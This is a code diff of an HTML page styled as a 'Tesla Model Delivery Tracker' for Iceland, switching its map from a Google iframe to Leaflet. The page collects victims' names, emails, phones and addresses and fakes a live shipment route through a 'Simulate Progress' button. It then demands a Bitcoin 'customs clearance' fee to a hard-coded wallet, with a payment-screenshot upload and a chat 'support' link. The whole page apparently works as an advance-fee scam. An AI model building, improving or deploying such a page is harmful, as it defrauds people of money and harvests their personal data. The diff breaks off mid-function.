@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Tesla Model Delivery Tracker</title>
+  <title>Tesla Model Delivery Tracker - Iceland</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
     * {
       margin: 0;
@@ -15,24 +16,20 @@
       width: 100%;
       height: 100%;
       overflow-x: hidden;
-    }
-
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-      background: #0a0e27;
-      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background-color: #0a0a0a;
+      color: #ffffff;
       line-height: 1.6;
     }
 
-    /* === NAVIGATION BAR === */
     .navbar {
-      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+      background-color: #1a1a1a;
       padding: 15px 30px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 4px 20px rgba(220, 20, 60, 0.3);
       position: sticky;
       top: 0;
       z-index: 100;
-      border-bottom: 2px solid #dc143c;
+      border-bottom: 3px solid #dc143c;
     }
 
     .navbar-content {
@@ -61,36 +58,36 @@
     }
 
     .nav-status {
-      background: rgba(220, 20, 60, 0.2);
+      background-color: rgba(220, 20, 60, 0.2);
       padding: 8px 15px;
       border-radius: 25px;
-      border: 1px solid #dc143c;
+      border: 2px solid #dc143c;
       font-size: 0.85em;
       font-weight: 600;
       text-transform: uppercase;
       letter-spacing: 1px;
+      color: #ff6b6b;
     }
 
     .support-btn {
-      background: #dc143c;
+      background-color: #dc143c;
       color: white;
       padding: 10px 20px;
       border: none;
       border-radius: 6px;
       cursor: pointer;
       font-weight: 600;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-decoration: none;
       display: inline-block;
     }
 
     .support-btn:hover {
-      background: #b30a30;
+      background-color: #b30a30;
       transform: translateY(-2px);
-      box-shadow: 0 8px 20px rgba(220, 20, 60, 0.3);
+      box-shadow: 0 8px 20px rgba(220, 20, 60, 0.4);
     }
 
-    /* === MAIN CONTAINER === */
     .main-container {
       max-width: 1400px;
       margin: 0 auto;
@@ -103,6 +100,7 @@
       min-height: calc(100vh - 70px);
       padding: 40px 30px;
       animation: fadeIn 0.5s ease-in-out;
+      background-color: #0a0a0a;
     }
 
     .page.active {
@@ -121,18 +119,6 @@
       }
     }
 
-    /* === PAGE 1: SPLASH SCREEN === */
-    #page-splash {
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
-    }
-
-    .splash-content {
-      animation: slideUp 0.8s ease-out;
-    }
-
     @keyframes slideUp {
       from {
         opacity: 0;
@@ -144,38 +130,51 @@
       }
     }
 
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-20px); }
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    #page-splash {
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      background-color: #0a0a0a;
+    }
+
+    .splash-content {
+      animation: slideUp 0.8s ease-out;
+    }
+
     .splash-logo {
       font-size: 5em;
       margin-bottom: 20px;
       animation: float 3s ease-in-out infinite;
     }
 
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); }
-      50% { transform: translateY(-20px); }
-    }
-
     .splash-title {
       font-size: 3em;
       font-weight: 900;
       margin-bottom: 15px;
-      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
+      color: #dc143c;
       text-transform: uppercase;
       letter-spacing: 3px;
     }
 
     .splash-subtitle {
       font-size: 1.3em;
-      color: #aaa;
+      color: #999999;
       margin-bottom: 40px;
       font-weight: 300;
     }
 
     .splash-btn {
-      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      background-color: #dc143c;
       color: white;
       padding: 16px 50px;
       border: none;
@@ -183,28 +182,28 @@
       font-size: 1.1em;
       font-weight: 700;
       cursor: pointer;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 1px;
       box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
     }
 
     .splash-btn:hover {
+      background-color: #ff6b6b;
       transform: translateY(-3px);
       box-shadow: 0 15px 40px rgba(220, 20, 60, 0.5);
     }
 
-    /* === PAGE 2: REGISTRATION === */
     #page-registration {
       justify-content: center;
       align-items: center;
-      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+      background-color: #0a0a0a;
     }
 
     .registration-container {
       width: 100%;
       max-width: 500px;
-      background: #1a1a1a;
+      background-color: #1a1a1a;
       border: 2px solid #dc143c;
       border-radius: 15px;
       padding: 50px 40px;
@@ -225,7 +224,7 @@
     }
 
     .reg-header p {
-      color: #999;
+      color: #999999;
       font-size: 0.95em;
     }
 
@@ -236,7 +235,7 @@
     label {
       display: block;
       margin-bottom: 10px;
-      color: #fff;
+      color: #ffffff;
       font-weight: 600;
       font-size: 0.95em;
       text-transform: uppercase;
@@ -249,13 +248,13 @@
     textarea {
       width: 100%;
       padding: 14px 16px;
-      border: 2px solid #333;
+      border: 2px solid #333333;
       border-radius: 8px;
-      background: #0f0f0f;
-      color: #fff;
+      background-color: #0f0f0f;
+      color: #ffffff;
       font-size: 1em;
       font-family: inherit;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
     }
 
     input[type="text"]:focus,
@@ -265,12 +264,12 @@
       outline: none;
       border-color: #dc143c;
       box-shadow: 0 0 20px rgba(220, 20, 60, 0.2);
-      background: #1a1a1a;
+      background-color: #1a1a1a;
     }
 
     input::placeholder,
     textarea::placeholder {
-      color: #666;
+      color: #666666;
     }
 
     textarea {
@@ -284,12 +283,6 @@
       gap: 20px;
     }
 
-    @media (max-width: 600px) {
-      .form-row {
-        grid-template-columns: 1fr;
-      }
-    }
-
     .error-text {
       color: #ff6b6b;
       font-size: 0.8em;
@@ -301,7 +294,7 @@
     input.error,
     textarea.error {
       border-color: #ff6b6b;
-      background: rgba(255, 107, 107, 0.05);
+      background-color: rgba(255, 107, 107, 0.05);
     }
 
     .form-actions {
@@ -312,7 +305,7 @@
 
     .btn-primary {
       flex: 1;
-      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      background-color: #dc143c;
       color: white;
       padding: 14px 30px;
       border: none;
@@ -320,12 +313,13 @@
       font-size: 1em;
       font-weight: 700;
       cursor: pointer;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 1px;
     }
 
     .btn-primary:hover {
+      background-color: #ff6b6b;
       transform: translateY(-2px);
       box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
     }
@@ -336,7 +330,7 @@
 
     .btn-secondary {
       flex: 1;
-      background: transparent;
+      background-color: transparent;
       color: #dc143c;
       padding: 14px 30px;
       border: 2px solid #dc143c;
@@ -344,27 +338,26 @@
       font-size: 1em;
       font-weight: 700;
       cursor: pointer;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 1px;
     }
 
     .btn-secondary:hover {
-      background: rgba(220, 20, 60, 0.1);
+      background-color: rgba(220, 20, 60, 0.1);
       transform: translateY(-2px);
     }
 
-    /* === PAGE 3: TRACKING SELECTION === */
     #page-tracking-select {
       justify-content: center;
       align-items: center;
-      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+      background-color: #0a0a0a;
     }
 
     .tracking-select-container {
       width: 100%;
       max-width: 600px;
-      background: #1a1a1a;
+      background-color: #1a1a1a;
       border: 2px solid #dc143c;
       border-radius: 15px;
       padding: 50px 40px;
@@ -381,7 +374,7 @@
     }
 
     .tracking-select-container p {
-      color: #999;
+      color: #999999;
       margin-bottom: 35px;
       font-size: 0.95em;
     }
@@ -389,16 +382,16 @@
     .tracking-input {
       width: 100%;
       padding: 14px 16px;
-      border: 2px solid #333;
+      border: 2px solid #333333;
       border-radius: 8px;
-      background: #0f0f0f;
-      color: #fff;
+      background-color: #0f0f0f;
+      color: #dc143c;
       font-size: 1.05em;
       text-align: center;
       font-weight: 600;
       letter-spacing: 2px;
       margin-bottom: 25px;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
     }
 
     .tracking-input:focus {
@@ -412,15 +405,32 @@
       gap: 15px;
     }
 
-    /* === PAGE 4: LIVE TRACKING MAP === */
     #page-map {
-      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+      background-color: #0a0a0a;
       padding: 30px;
+      flex-direction: column;
+    }
+
+    .map-header {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .map-header h2 {
+      font-size: 2em;
+      color: #dc143c;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 10px;
+    }
+
+    .map-header p {
+      color: #999999;
     }
 
     .map-container {
       width: 100%;
-      height: calc(100vh - 200px);
+      height: calc(100vh - 350px);
       border: 3px solid #dc143c;
       border-radius: 15px;
       overflow: hidden;
@@ -428,14 +438,13 @@
       margin-bottom: 30px;
     }
 
-    .map-container iframe {
+    #map {
       width: 100%;
       height: 100%;
-      border: none;
     }
 
     .tracking-status {
-      background: #1a1a1a;
+      background-color: #1a1a1a;
       border: 2px solid #dc143c;
       border-radius: 12px;
       padding: 25px;
@@ -446,7 +455,7 @@
     }
 
     .status-item {
-      background: linear-gradient(135deg, rgba(220, 20, 60, 0.1) 0%, rgba(255, 107, 107, 0.05) 100%);
+      background-color: rgba(220, 20, 60, 0.1);
       padding: 20px;
       border-radius: 10px;
       border-left: 4px solid #dc143c;
@@ -454,7 +463,7 @@
     }
 
     .status-label {
-      color: #999;
+      color: #999999;
       font-size: 0.85em;
       text-transform: uppercase;
       letter-spacing: 1px;
@@ -481,25 +490,25 @@
       font-size: 1em;
       font-weight: 700;
       cursor: pointer;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 1px;
-    }
-
-    .btn-continue {
-      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
-      color: white;
       border: none;
     }
 
+    .btn-continue {
+      background-color: #dc143c;
+      color: white;
+    }
+
     .btn-continue:hover {
+      background-color: #ff6b6b;
       transform: translateY(-2px);
       box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
     }
 
-    /* === PAGE 5: PAYMENT === */
     #page-payment {
-      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+      background-color: #0a0a0a;
       padding: 40px 30px;
     }
 
@@ -522,7 +531,7 @@
     }
 
     .payment-header p {
-      color: #999;
+      color: #999999;
       font-size: 1.05em;
     }
 
@@ -533,14 +542,8 @@
       margin-bottom: 40px;
     }
 
-    @media (max-width: 900px) {
-      .payment-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-
     .payment-card {
-      background: #1a1a1a;
+      background-color: #1a1a1a;
       border: 2px solid #dc143c;
       border-radius: 15px;
       padding: 35px 30px;
@@ -559,7 +562,7 @@
     }
 
     .payment-info {
-      color: #ccc;
+      color: #cccccc;
       line-height: 1.8;
       margin-bottom: 20px;
     }
@@ -571,21 +574,21 @@
     }
 
     .payment-info-label {
-      color: #999;
+      color: #999999;
       font-weight: 600;
       text-transform: uppercase;
       font-size: 0.85em;
     }
 
     .payment-info-value {
-      color: #fff;
+      color: #ffffff;
       font-weight: 700;
       text-align: right;
     }
 
     .wallet-address {
-      background: #0f0f0f;
-      border: 2px solid #333;
+      background-color: #0f0f0f;
+      border: 2px solid #333333;
       padding: 16px 14px;
       border-radius: 8px;
       word-break: break-all;
@@ -599,25 +602,26 @@
 
     .copy-btn {
       width: 100%;
-      background: rgba(220, 20, 60, 0.2);
+      background-color: rgba(220, 20, 60, 0.2);
       border: 2px solid #dc143c;
       color: #dc143c;
       padding: 12px;
       border-radius: 8px;
       cursor: pointer;
       font-weight: 600;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-transform: uppercase;
       font-size: 0.85em;
       letter-spacing: 1px;
     }
 
     .copy-btn:hover {
-      background: rgba(220, 20, 60, 0.3);
+      background-color: rgba(220, 20, 60, 0.3);
+      color: #ff6b6b;
     }
 
     .recipient-card {
-      background: linear-gradient(135deg, rgba(220, 20, 60, 0.1) 0%, rgba(255, 107, 107, 0.05) 100%);
+      background-color: rgba(220, 20, 60, 0.1);
       border: 2px solid #dc143c;
       border-radius: 12px;
       padding: 25px;
@@ -633,7 +637,7 @@
     }
 
     .recipient-info {
-      color: #ccc;
+      color: #cccccc;
       line-height: 1.8;
     }
 
@@ -642,19 +646,19 @@
     }
 
     .recipient-label {
-      color: #999;
+      color: #999999;
       font-size: 0.85em;
       text-transform: uppercase;
       font-weight: 600;
     }
 
     .warning-box {
-      background: linear-gradient(135deg, rgba(255, 107, 107, 0.1) 0%, rgba(220, 20, 60, 0.1) 100%);
+      background-color: rgba(255, 107, 107, 0.1);
       border-left: 4px solid #ff6b6b;
       border-radius: 8px;
       padding: 20px;
       margin: 30px 0;
-      color: #ccc;
+      color: #cccccc;
       line-height: 1.8;
     }
 
@@ -684,7 +688,7 @@
 
     .btn-file-upload label {
       display: block;
-      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      background-color: #dc143c;
       color: white;
       padding: 14px 25px;
       border-radius: 8px;
@@ -692,7 +696,7 @@
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 1px;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-align: center;
       font-size: 1em;
       margin: 0;
@@ -700,22 +704,22 @@
 
     .btn-file-upload input[type="file"]:checked + label,
     .btn-file-upload label:hover {
+      background-color: #ff6b6b;
       transform: translateY(-2px);
       box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
     }
 
     .file-name {
-      color: #999;
+      color: #999999;
       font-size: 0.85em;
       margin-top: 10px;
       text-align: center;
     }
 
-    /* === PAGE 6: CONFIRMATION === */
     #page-confirmation {
       justify-content: center;
       align-items: center;
-      background: linear-gradient(135deg, #0a0e27 0%, #1a1a1a 100%);
+      background-color: #0a0a0a;
       padding: 40px 30px;
     }
 
@@ -731,11 +735,6 @@
       animation: pulse 2s ease-in-out infinite;
     }
 
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-    }
-
     .confirmation-title {
       font-size: 2.5em;
       color: #dc143c;
@@ -746,14 +745,14 @@
     }
 
     .confirmation-subtitle {
-      color: #999;
+      color: #999999;
       font-size: 1.1em;
       margin-bottom: 35px;
       line-height: 1.6;
     }
 
     .confirmation-details {
-      background: #1a1a1a;
+      background-color: #1a1a1a;
       border: 2px solid #dc143c;
       border-radius: 12px;
       padding: 30px;
@@ -765,8 +764,8 @@
       display: flex;
       justify-content: space-between;
       padding: 15px 0;
-      border-bottom: 1px solid #333;
-      color: #ccc;
+      border-bottom: 1px solid #333333;
+      color: #cccccc;
     }
 
     .detail-row:last-child {
@@ -774,7 +773,7 @@
     }
 
     .detail-label {
-      color: #999;
+      color: #999999;
       font-weight: 600;
       text-transform: uppercase;
       font-size: 0.85em;
@@ -802,7 +801,7 @@
 
     .btn-finish {
       flex: 1;
-      background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
+      background-color: #dc143c;
       color: white;
       padding: 14px 25px;
       border: none;
@@ -810,12 +809,13 @@
       font-size: 1em;
       font-weight: 700;
       cursor: pointer;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 1px;
     }
 
     .btn-finish:hover {
+      background-color: #ff6b6b;
       transform: translateY(-2px);
       box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
     }
@@ -823,8 +823,8 @@
     .support-contact {
       margin-top: 40px;
       padding-top: 30px;
-      border-top: 2px solid #333;
-      color: #999;
+      border-top: 2px solid #333333;
+      color: #999999;
     }
 
     .support-contact p {
@@ -833,44 +833,27 @@
 
     .support-contact a {
       display: inline-block;
-      background: #dc143c;
+      background-color: #dc143c;
       color: white;
       padding: 12px 25px;
       border-radius: 8px;
       text-decoration: none;
       font-weight: 600;
       margin-top: 10px;
-      transition: all 0.3s;
+      transition: all 0.3s ease;
       text-transform: uppercase;
       font-size: 0.85em;
     }
 
     .support-contact a:hover {
-      background: #b30a30;
+      background-color: #ff6b6b;
       transform: translateY(-2px);
     }
 
-    /* === LOADER === */
-    .loader {
-      width: 50px;
-      height: 50px;
-      border: 5px solid #333;
-      border-top: 5px solid #dc143c;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    /* === PROGRESS INDICATOR === */
     .progress-bar {
       width: 100%;
       height: 4px;
-      background: #333;
+      background-color: #333333;
       margin-bottom: 30px;
       border-radius: 2px;
       overflow: hidden;
@@ -878,12 +861,44 @@
 
     .progress-fill {
       height: 100%;
-      background: linear-gradient(90deg, #dc143c 0%, #ff6b6b 100%);
+      background-color: #dc143c;
       transition: width 0.5s ease;
       width: 0%;
     }
 
-    /* === RESPONSIVE === */
+    .leaflet-popup-content-wrapper {
+      background-color: #1a1a1a !important;
+      border: 2px solid #dc143c !important;
+      color: #ffffff !important;
+    }
+
+    .leaflet-popup-tip {
+      background-color: #1a1a1a !important;
+    }
+
+    .leaflet-container {
+      background-color: #1a1a1a !important;
+    }
+
+    .leaflet-control-zoom {
+      border: 2px solid #dc143c !important;
+    }
+
+    .leaflet-control-zoom a {
+      background-color: #1a1a1a !important;
+      color: #dc143c !important;
+      border-bottom: 2px solid #dc143c !important;
+    }
+
+    .leaflet-control-zoom a:hover {
+      background-color: rgba(220, 20, 60, 0.2) !important;
+    }
+
+    .leaflet-control-attribution {
+      background-color: rgba(26, 26, 26, 0.8) !important;
+      color: #999999 !important;
+    }
+
     @media (max-width: 768px) {
       .navbar-content {
         flex-direction: column;
@@ -920,6 +935,10 @@
         flex-direction: column;
       }
 
+      .form-row {
+        grid-template-columns: 1fr;
+      }
+
       .detail-row {
         flex-direction: column;
         gap: 8px;
@@ -932,25 +951,25 @@
       .confirmation-actions {
         flex-direction: column;
       }
+
+      .tracking-actions {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
 <body>
-  <!-- NAVIGATION BAR -->
   <div class="navbar">
     <div class="navbar-content">
       <div class="logo">⚡ TESLA TRACKER</div>
       <div class="nav-links">
         <span class="nav-status" id="navStatus">Status: Initialization</span>
-        <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" 
-           target="_blank" class="support-btn">Support</a>
+        <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank" class="support-btn">Support</a>
       </div>
     </div>
   </div>
 
-  <!-- MAIN CONTAINER -->
   <div class="main-container">
-
     <!-- PAGE 1: SPLASH SCREEN -->
     <div class="page active" id="page-splash">
       <div class="splash-content">
@@ -968,7 +987,6 @@
           <h1>📋 Registration</h1>
           <p>Complete your profile to begin tracking</p>
         </div>
-
         <form id="registrationForm" onsubmit="submitRegistration(event)">
           <div class="form-row">
             <div class="form-group">
@@ -982,7 +1000,6 @@
               <span class="error-text">Valid email required</span>
             </div>
           </div>
-
           <div class="form-row">
             <div class="form-group">
               <label for="phone">Contact Number</label>
@@ -995,13 +1012,11 @@
               <span class="error-text">Tracking number required</span>
             </div>
           </div>
-
           <div class="form-group">
             <label for="address">Iceland Delivery Address</label>
             <textarea id="address" placeholder="Street address, postal code, city, Iceland" required></textarea>
             <span class="error-text">Valid address required (minimum 10 characters)</span>
           </div>
-
           <div class="form-actions">
             <button type="button" class="btn-secondary" onclick="goToPage('splash')">Back</button>
             <button type="submit" class="btn-primary">Continue</button>
@@ -1016,9 +1031,7 @@
         <h1>🚗 Start Tracking</h1>
         <p>Your tracking information has been verified</p>
         <p style="color: #dc143c; font-weight: 700;">Ready to track your Tesla delivery?</p>
-
         <input type="text" class="tracking-input" id="trackingDisplay" disabled />
-
         <div class="tracking-buttons">
           <button class="btn-secondary" onclick="goToPage('registration')">Back</button>
           <button class="btn-primary" onclick="goToPage('map')">Start Live Tracking</button>
@@ -1031,15 +1044,17 @@
       <div class="progress-bar">
         <div class="progress-fill" style="width: 50%;"></div>
       </div>
-
-      <div class="map-container">
-        <iframe src="https://maps.app.goo.gl/a2dnvXy3NrM5UQUc9" allowfullscreen="" loading="lazy"></iframe>
+      <div class="map-header">
+        <h2>🌍 Live Delivery Route</h2>
+        <p>Real-time tracking from Tesla HQ, California to Iceland</p>
       </div>
-
+      <div class="map-container">
+        <div id="map"></div>
+      </div>
       <div class="tracking-status">
         <div class="status-item">
           <div class="status-label">📍 Current Location</div>
-          <div class="status-value" id="statusLocation">Tesla Factory</div>
+          <div class="status-value" id="statusLocation">Tesla Factory, CA</div>
         </div>
         <div class="status-item">
           <div class="status-label">⏱️ Estimated Time</div>
@@ -1054,7 +1069,6 @@
           <div class="status-value" id="statusPackage">Secured</div>
         </div>
       </div>
-
       <div class="tracking-actions">
         <button class="btn-secondary" onclick="goToPage('tracking-select')">Back</button>
         <button class="btn-continue" onclick="simulateTracking()">Simulate Progress</button>
@@ -1067,18 +1081,14 @@
       <div class="progress-bar">
         <div class="progress-fill" style="width: 75%;"></div>
       </div>
-
       <div class="payment-content">
         <div class="payment-header">
           <h1>💳 Payment & Clearance</h1>
           <p>Complete the clearance payment to finalize delivery</p>
         </div>
-
         <div class="payment-grid">
-          <!-- Payment Information -->
           <div class="payment-card">
             <h2>💰 Payment Details</h2>
-
             <div class="payment-info">
               <p>
                 <span class="payment-info-label">Clearance Fee</span>
@@ -1093,9 +1103,8 @@
                 <span class="payment-info-value">BTC</span>
               </p>
             </div>
-
-            <div style="background: #0f0f0f; padding: 15px; border-radius: 8px; text-align: left;">
-              <p style="color: #999; font-size: 0.85em; text-transform: uppercase; margin-bottom: 10px;">Bitcoin Wallet Address</p>
+            <div style="background-color: #0f0f0f; padding: 15px; border-radius: 8px; text-align: left;">
+              <p style="color: #999999; font-size: 0.85em; text-transform: uppercase; margin-bottom: 10px;">Bitcoin Wallet Address</p>
               <div class="wallet-address">
                 bc1q5mtqsh96qmnesfrn0dtc9je2e2ts904pnpswvc
               </div>
@@ -1104,40 +1113,35 @@
               </button>
             </div>
           </div>
-
-          <!-- Recipient Information -->
           <div class="payment-card">
             <h2>📮 Recipient Info</h2>
-
             <div class="recipient-card">
               <h3>Delivery Details</h3>
               <div class="recipient-info">
                 <p>
                   <span class="recipient-label">Name:</span><br/>
-                  <span id="recipientName" style="color: #fff; font-weight: 600;">—</span>
+                  <span id="recipientName" style="color: #ffffff; font-weight: 600;">—</span>
                 </p>
                 <p>
                   <span class="recipient-label">Email:</span><br/>
-                  <span id="recipientEmail" style="color: #fff; font-weight: 600;">—</span>
+                  <span id="recipientEmail" style="color: #ffffff; font-weight: 600;">—</span>
                 </p>
                 <p>
                   <span class="recipient-label">Phone:</span><br/>
-                  <span id="recipientPhone" style="color: #fff; font-weight: 600;">—</span>
+                  <span id="recipientPhone" style="color: #ffffff; font-weight: 600;">—</span>
                 </p>
                 <p>
                   <span class="recipient-label">Address:</span><br/>
-                  <span id="recipientAddress" style="color: #fff; font-weight: 600;">—</span>
+                  <span id="recipientAddress" style="color: #ffffff; font-weight: 600;">—</span>
                 </p>
               </div>
             </div>
           </div>
         </div>
-
         <div class="warning-box">
           <strong>⚠️ Important Notice</strong>
           <p>Please ensure you have sufficient Bitcoin balance. The payment is required for customs clearance and final delivery to Iceland. Once confirmed, your Tesla Model will proceed immediately to your delivery address.</p>
         </div>
-
         <div class="payment-actions">
           <div class="btn-file-upload">
             <input type="file" id="paymentFile" accept="image/*" onchange="handleFileUpload()" />
@@ -1146,7 +1150,6 @@
           </div>
           <button class="btn-primary" onclick="processPayment()" id="payBtn">Proceed to Confirmation</button>
         </div>
-
         <button class="btn-secondary" style="width: 100%; margin-top: 15px;" onclick="goToPage('map')">Back to Tracking</button>
       </div>
     </div>
@@ -1156,12 +1159,10 @@
       <div class="progress-bar">
         <div class="progress-fill" style="width: 100%;"></div>
       </div>
-
       <div class="confirmation-container">
         <div class="success-badge">✅</div>
         <h1 class="confirmation-title">Payment Confirmed</h1>
         <p class="confirmation-subtitle">Your Tesla Model delivery is now in final processing stage. Customs clearance is complete.</p>
-
         <div class="confirmation-details">
           <div class="detail-row">
             <span class="detail-label">📦 Vehicle</span>
@@ -1188,29 +1189,24 @@
             <span class="detail-value">48-72 Hours</span>
           </div>
         </div>
-
         <img id="confirmImage" class="confirmation-image" src="" alt="Payment Confirmation" />
-
         <div class="confirmation-actions">
           <button class="btn-finish" onclick="completeTracking()">Complete Tracking</button>
         </div>
-
         <div class="support-contact">
           <p>Questions about your delivery? Our support team is ready to help.</p>
-          <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" 
-             target="_blank">💬 Contact Support 24/7</a>
+          <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank">💬 Contact Support 24/7</a>
         </div>
       </div>
     </div>
-
   </div>
 
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script>
     let userCache = {};
-    let currentStep = 1;
-    const validTracking = 'TM2022ICELAND';
+    let map = null;
+    let currentMarker = null;
 
-    // Page Navigation
     function goToPage(pageId) {
       const pages = document.querySelectorAll('.page');
       pages.forEach(page => page.classList.remove('active'));
@@ -1218,45 +1214,77 @@
       updateProgress(pageId);
       updateNavStatus(pageId);
       window.scrollTo(0, 0);
+      if (pageId === 'map') setTimeout(() => initializeMap(), 100);
     }
 
-    // Progress Bar Update
+    function initializeMap() {
+      if (map) return;
+      const teslaHQ = [37.3861, -122.0839];
+      const iceland = [64.9631, -19.0208];
+      map = L.map('map').setView([50, -30], 3);
+      L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, CartoDB', maxZoom: 19 }).addTo(map);
+      
+      const startMarker = L.circleMarker(teslaHQ, { radius: 12, fillColor: '#dc143c', color: '#ff6b6b', weight: 3, opacity: 1, fillOpacity: 0.8 }).addTo(map);
+      startMarker.bindPopup(`<div style="color: #fff; background: #1a1a1a; padding: 10px; border-radius: 5px;"><strong style="color: #dc143c;">ORIGIN</strong><br>Tesla Factory<br>Fremont, California</div>`);
+      
+      const endMarker = L.circleMarker(iceland, { radius: 12, fillColor: '#ff6b6b', color: '#dc143c', weight: 3, opacity: 1, fillOpacity: 0.8 }).addTo(map);
+      endMarker.bindPopup(`<div style="color: #fff; background: #1a1a1a; padding: 10px; border-radius: 5px;"><strong style="color: #dc143c;">DESTINATION</strong><br>Iceland<br>Reykjavik</div>`);
+      
+      currentMarker = L.circleMarker(teslaHQ, { radius: 10, fillColor: '#00ff00', color: '#ffffff', weight: 3, opacity: 1, fillOpacity: 0.9 }).addTo(map);
+      currentMarker.bindPopup(`<div style="color: #fff; background: #1a1a1a; padding: 10px; border-radius: 5px;"><strong style="color: #00ff00;">CURRENT LOCATION</strong><br>🚗 In Transit</div>`);
+      
+      L.polyline([teslaHQ, iceland], { color: '#dc143c', weight: 3, opacity: 0.8, dashArray: '10, 5' }).addTo(map);
+      const group = new L.featureGroup([startMarker, endMarker, currentMarker]);
+      map.fitBounds(group.getBounds().pad(0.1));
+      animateCurrentMarker();
+    }
+
+    function animateCurrentMarker() {
+      if (!currentMarker) return;
+      let pulseSize = 10, increasing = true;
+      setInterval(() => {
+        increasing ? (pulseSize += 0.5, pulseSize > 16 && (increasing = false)) : (pulseSize -= 0.5, pulseSize < 10 && (increasing = true));
+        currentMarker.setRadius(pulseSize);
+      }, 50);
+    }
+
+    function simulateTracking() {
+      const teslaHQ = [37.3861, -122.0839];
+      const iceland = [64.9631, -19.0208];
+      const locations = [
+        { name: 'Tesla Factory, CA', coords: teslaHQ, status: 'Depart' },
+        { name: 'Pacific Ocean', coords: [40.5, -130], status: 'Crossing Ocean' },
+        { name: 'Over Atlantic', coords: [50, -50], status: 'Mid-Atlantic' },
+        { name: 'Approaching Iceland', coords: [60, -25], status: 'Arrival Soon' },
+        { name: 'Reykjavik, Iceland', coords: iceland, status: 'Arrived' }
+      ];
+      let index = 0;
+      const interval = setInterval(() => {
+        if (index < locations.length) {
+          document.getElementById('statusLocation').textContent = locations[index].name;
+          document.getElementById('statusVehicle').textContent = locations[index].status;
+          if (currentMarker && map) {
+            currentMarker.setLatLng(locations[index].coords);
+            map.setView(locations[index].coords, map.getZoom());
+          }
+          index++;
+        } else clearInterval(interval);
+      }, 2000);
+    }
+
     function updateProgress(pageId) {
-      const progressMap = {
-        'splash': 0,
-        'registration': 20,
-        'tracking-select': 40,
-        'map': 50,
-        'payment': 75,
-        'confirmation': 100
-      };
+      const progressMap = { splash: 0, registration: 20, 'tracking-select': 40, map: 50, payment: 75, confirmation: 100 };
       const progressFill = document.querySelector('.progress-fill');
-      if (progressFill) {
-        progressFill.style.width = (progressMap[pageId] || 0) + '%';
-      }
+      if (progressFill) progressFill.style.width = (progressMap[pageId] || 0) + '%';
     }
 
-    // Navigation Status Update
     function updateNavStatus(pageId) {
-      const statusMap = {
-        'splash': 'Initialization',
-        'registration': 'Registration',
-        'tracking-select': 'Verification',
-        'map': 'Live Tracking',
-        'payment': 'Payment Processing',
-        'confirmation': 'Confirmed'
-      };
